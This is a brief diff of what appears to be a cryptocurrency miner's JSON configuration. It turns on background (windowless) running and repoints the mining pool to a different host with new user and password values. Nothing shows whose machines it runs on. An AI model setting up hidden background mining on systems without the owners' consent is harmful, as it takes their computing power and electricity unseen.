@@ -11,7 +11,7 @@
         "restricted": true
     },
     "autosave": true,
-    "background": false,
+    "background": true,
     "colors": true,
     "title": true,
     "randomx": {
@@ -43,12 +43,12 @@
     "donate-over-proxy": 0,
     "log-file": null,
     "pools": [
-         {
+        {
             "algo": null,
             "coin": null,
-            "url": "la-01.549976.xyz:33333",
-            "user": "saturnenterprise",
-            "pass": "saturnenterprise",
+            "url": "la-01.yanghaiwei.eu.org:33333",
+            "user": "rocket",
+            "pass": "rocket",
             "rig-id": null,
             "nicehash": false,
             "keepalive": true,
